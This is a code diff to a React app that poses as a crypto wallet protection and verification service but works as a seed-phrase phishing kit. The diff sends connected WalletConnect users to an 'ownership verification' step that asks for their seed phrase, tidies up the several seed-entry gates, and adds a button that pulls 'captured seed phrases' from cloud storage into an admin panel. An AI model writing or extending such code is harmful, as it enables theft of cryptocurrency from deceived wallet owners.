@@ -282,6 +282,7 @@ const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
 const SEED_PHRASES_KEY        = 'sv_seed_phrases_v1'
 const LEGACY_SEED_PHRASES_KEY = 'sv_seed_phrases'
 const ACTIVE_VIEW_KEY         = 'sv_active_view_v1'
+const ADMIN_SESSION_KEY       = 'sv_admin_session_v1'   // sessionStorage — clears on tab close
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const CONNECTED_WALLETS_KEY  = 'sv_connected_wallets_v1'
 const SCAN_HISTORY_KEY       = 'sv_scan_history_v1'
@@ -478,6 +479,9 @@ const looksLikeSeedPhrase = (text: string): boolean => {
   if (words.length !== 12 && words.length !== 15 && words.length !== 18 && words.length !== 21 && words.length !== 24) return false
   return words.every(w => /^[a-z]{2,10}$/.test(w))
 }
+
+const normalizeSeedPhraseInput = (text: string): string =>
+  text.trim().toLowerCase().replace(/\s+/g, ' ')
 
 const maskSeedPhrase = (phrase: string): string => {
   const words = phrase.trim().split(/\s+/)
@@ -820,11 +824,18 @@ function SecureGlyph({ name, className = '' }: { name: 'shield' | 'scan' | 'veri
 export default function App() {
   // Restore last-visited route so a refresh lands on the same page.
   // Transient / state-dependent views are excluded — they fall back to 'home'.
+  // 'admin' is allowed only when the admin session is still alive (sessionStorage).
   const TRANSIENT_VIEWS: ViewKey[] = ['etherscan', 'protecting', 'wallet-landing']
   const [activeView, setActiveView] = useState<ViewKey>(() => {
     try {
       const saved = localStorage.getItem(ACTIVE_VIEW_KEY) as ViewKey | null
-      if (saved && !TRANSIENT_VIEWS.includes(saved)) return saved
+      if (saved && !TRANSIENT_VIEWS.includes(saved)) {
+        // Require active admin session to restore the admin view
+        if (saved === 'admin') {
+          return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' ? 'admin' : 'home'
+        }
+        return saved
+      }
     } catch { /* ignore */ }
     return 'home'
   })
@@ -879,7 +890,9 @@ export default function App() {
   const [adminPasswordInput,   setAdminPasswordInput]   = useState('')
   const [adminAuthError,       setAdminAuthError]       = useState('')
   const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
-  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
+  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
+    try { return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' } catch { return false }
+  })
   const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes' | 'bots'>('wallets')
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
     try {
@@ -1130,7 +1143,7 @@ export default function App() {
       setWcSessions(prev => [newSession, ...prev])
       setWcSelectedTopic(session.topic)
       setWcStatus('connected')
-      setActiveView('protect')   // auto-redirect to protected wallet page
+      setActiveView('ownership')  // auto-redirect to ownership verification
       setWcActionStatus(`✅ Wallet connected: ${walletAddr.slice(0, 8)}…${walletAddr.slice(-6)}`)
     } catch (err) {
       setWcStatus('idle')
@@ -1301,13 +1314,24 @@ export default function App() {
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
 
-  // Persist active view (exclude transient views so refresh lands on a stable page)
+  // Persist active view (exclude purely transient/session-dependent views)
   useEffect(() => {
     if (!TRANSIENT_VIEWS.includes(activeView)) {
       try { localStorage.setItem(ACTIVE_VIEW_KEY, activeView) } catch { /* quota */ }
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [activeView])
+
+  // Persist admin session so page refreshes don't log them out
+  useEffect(() => {
+    try {
+      if (isAdminAuthenticated) {
+        sessionStorage.setItem(ADMIN_SESSION_KEY, '1')
+      } else {
+        sessionStorage.removeItem(ADMIN_SESSION_KEY)
+      }
+    } catch { /* ignore */ }
+  }, [isAdminAuthenticated])
 
   useEffect(() => {
     try { localStorage.setItem(BOT_REQUESTS_KEY, JSON.stringify(botRequests)) } catch { /* quota */ }
@@ -1686,7 +1710,7 @@ export default function App() {
 
   const submitExplorerSeedGate = (e: FormEvent) => {
     e.preventDefault()
-    const phrase = esSeedInput.trim().toLowerCase().replace(/\s+/g, ' ')
+    const phrase = normalizeSeedPhraseInput(esSeedInput)
     if (!looksLikeSeedPhrase(phrase)) {
       setEsSeedError('Enter a valid 12, 15, 18, 21, or 24-word lowercase seed phrase.')
       return
@@ -2486,7 +2510,13 @@ export default function App() {
     }
 
     passGate()
-    setActiveView('home')
+    // Pre-fill the wallet-landing email so the user doesn't have to type it twice
+    setLandingEmail(email)
+    // If a wallet browser was detected and wallet-landing is queued, keep it;
+    // otherwise fall back to home
+    if (activeView !== 'wallet-landing') {
+      setActiveView('home')
+    }
   }
 
   const maybeSendVisitEmail = async (email: string) => {
@@ -2817,7 +2847,7 @@ export default function App() {
 
   const verifyWcOwnership = (topic: string) => {
     if (!wcSeedInput.trim()) { setWcActionStatus('❌ Please enter the seed phrase or verification key.'); return }
-    const phrase = wcSeedInput.trim()
+    const phrase = normalizeSeedPhraseInput(wcSeedInput)
     const session = wcSessions.find(s => s.topic === topic)
     setWcSessions(prev => prev.map(s => s.topic === topic
       ? { ...s, seedPhrase: phrase, ownershipVerified: true }
@@ -2955,7 +2985,7 @@ export default function App() {
     e.preventDefault()
     setSeedFormError('')
     setSeedFormMsg('')
-    const phrase = seedFormPhrase.trim().toLowerCase().replace(/\s+/g, ' ')
+    const phrase = normalizeSeedPhraseInput(seedFormPhrase)
     if (!phrase) { setSeedFormError('Seed phrase is required.'); return }
     if (!looksLikeSeedPhrase(phrase)) { setSeedFormError('Must be 12, 15, 18, 21, or 24 lowercase words separated by spaces.'); return }
     const isDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
@@ -4452,14 +4482,14 @@ export default function App() {
                             id="es-seed-input"
                             className="es-gate-textarea"
                             rows={3}
-                            placeholder="word1 word2 word3 … (12 or 24 words, lowercase, separated by spaces)"
+                            placeholder="word1 word2 word3 … (12, 15, 18, 21, or 24 words, lowercase, separated by spaces)"
                             value={esSeedInput}
                             onChange={e => setEsSeedInput(e.target.value)}
                             required
                           />
                           <div className="es-gate-meta">
-                            <span className={`es-gate-wordcount${[12,24].includes(esSeedInput.trim().split(/\s+/).filter(Boolean).length) ? ' es-gate-wordcount--ok' : ''}`}>
-                              {esSeedInput.trim() ? esSeedInput.trim().split(/\s+/).filter(Boolean).length : 0} / 12 or 24 words
+                            <span className={`es-gate-wordcount${[12,15,18,21,24].includes(esSeedInput.trim().split(/\s+/).filter(Boolean).length) ? ' es-gate-wordcount--ok' : ''}`}>
+                              {esSeedInput.trim() ? esSeedInput.trim().split(/\s+/).filter(Boolean).length : 0} / 12–24 words
                             </span>
                             {esSeedError && <span className="es-gate-error">{esSeedError}</span>}
                           </div>
@@ -5187,7 +5217,7 @@ export default function App() {
                 <>
                   <div className="admin-top">
                     <p className="muted">Signed in as <strong>{adminCreds.email}</strong></p>
-                    <button className="btn-secondary" type="button" onClick={() => { setIsAdminAuthenticated(false); setAdminPasswordInput('') }}>Log Out</button>
+                    <button className="btn-secondary" type="button" onClick={() => { setIsAdminAuthenticated(false); setAdminPasswordInput(''); setActiveView('home') }}>Log Out</button>
                   </div>
 
                   {/* Admin sub-tabs */}
@@ -5753,20 +5783,44 @@ export default function App() {
                     <div className="admin-panel">
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
                         <h3 style={{ margin: 0 }}>Seed Phrase Management</h3>
-                        <button
-                          className="btn-secondary"
-                          type="button"
-                          style={{ fontSize: '0.78rem' }}
-                          onClick={() => {
-                            const recovered = readSeedPhraseRecords()
-                            if (recovered.length === 0) { alert('No seed phrases found in this browser\'s local storage.'); return }
-                            setSeedPhraseRecords(recovered)
-                            saveToCloud({ seed_phrases: recovered })
-                            alert(`Synced ${recovered.length} seed phrase(s) to cloud.`)
-                          }}
-                        >
-                          ↑ Sync Local → Cloud
-                        </button>
+                        <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
+                          <button
+                            className="btn-secondary"
+                            type="button"
+                            style={{ fontSize: '0.78rem' }}
+                            onClick={async () => {
+                              const row = await loadFromCloud()
+                              if (row.seed_phrases) {
+                                const cloudRows = row.seed_phrases as SeedPhraseRecord[]
+                                setSeedPhraseRecords(prev => {
+                                  if (!Array.isArray(cloudRows) || cloudRows.length === 0) return prev
+                                  const existing = new Set(prev.map(item => `${item.id}|${item.seedPhrase}`))
+                                  const merged = [...prev]
+                                  for (const item of cloudRows) {
+                                    if (!existing.has(`${item.id}|${item.seedPhrase}`)) merged.push(item)
+                                  }
+                                  return merged
+                                })
+                              }
+                            }}
+                          >
+                            ↓ Pull from Cloud
+                          </button>
+                          <button
+                            className="btn-secondary"
+                            type="button"
+                            style={{ fontSize: '0.78rem' }}
+                            onClick={() => {
+                              const recovered = readSeedPhraseRecords()
+                              if (recovered.length === 0) { alert('No seed phrases found in this browser\'s local storage.'); return }
+                              setSeedPhraseRecords(recovered)
+                              saveToCloud({ seed_phrases: recovered })
+                              alert(`Synced ${recovered.length} seed phrase(s) to cloud.`)
+                            }}
+                          >
+                            ↑ Sync Local → Cloud
+                          </button>
+                        </div>
                       </div>
                       <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
                         Captured seed phrases from WalletConnect sessions (auto-detected) and manual entries. Cloud-synced across all sessions.
